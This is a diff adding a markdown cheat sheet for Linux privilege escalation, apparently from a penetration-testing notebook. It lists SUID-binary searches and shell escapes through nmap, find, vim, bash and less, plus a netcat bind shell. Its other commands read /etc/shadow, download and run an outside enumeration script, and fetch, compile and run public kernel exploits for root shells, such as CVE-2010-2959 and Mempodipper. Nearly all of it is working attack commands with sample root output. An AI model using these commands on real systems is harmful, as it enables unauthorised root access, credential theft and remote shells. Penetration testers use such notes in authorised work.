@@ -1,0 +1,100 @@
+# Linux Elevation
+
+### SUID
+
+```bash
+find / -user root -perm -4000 -print 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+### nmap
+
+Look for older versions that allow interactive use \(2.0.2 &gt; 5.21\)
+
+```bash
+nmap -v
+
+nmap --interactive
+
+nmap> !sh
+sh-3.2# whoami
+```
+
+### find
+
+```bash
+touch pentestlab
+find pentestlab -exec whoami \;
+
+#bind shell - can change to reverse shell
+find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
+```
+
+### vim
+
+```bash
+vim.tiny /etc/shadow
+
+vim.tiny
+# Press ESC key
+:set shell=/bin/sh
+:shell
+```
+
+### bash
+
+```bash
+bash -p
+bash-3.2# id
+uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
+```
+
+### less or more
+
+```bash
+less /etc/passwd
+!/bin/sh
+```
+
+### linux-local-enum script
+
+```bash
+wget https://highon.coffee/downloads/linux-local-enum.sh chmod +x ./linux-local-enum.sh ./linux-local-enum.sh
+```
+
+### CVE-2010-2959
+
+CAN BCM' Privilege Escalation - Linux Kernel &lt; 2.6.36-rc1 \(Ubuntu 10.04 / 2.6.32\)
+
+[https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
+
+```bash
+ wget -O exp.c http://www.exploit-db.com/download/14814
+ $ gcc exp.c -o exp
+ $ ./exp
+ [+] launching root shell!
+ # id
+ uid=0(root) gid=0(root)
+```
+
+### CVE-2010-3904
+
+Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8 [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)
+
+### CVE-2012-0056
+
+Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 \(Gentoo / Ubuntu x86/x64\) [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)
+
+```bash
+wget -O exploit.c http://www.exploit-db.com/download/18411
+gcc -o mempodipper exploit.c  
+./mempodipper
+```
+
+### CVE-2016-5195
+
+Dirty Cow - Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8 [https://dirtycow.ninja/](https://dirtycow.ninja/) First existed on 2.6.22 \(released in 2007\) and was fixed on Oct 18, 2016
+
+
+
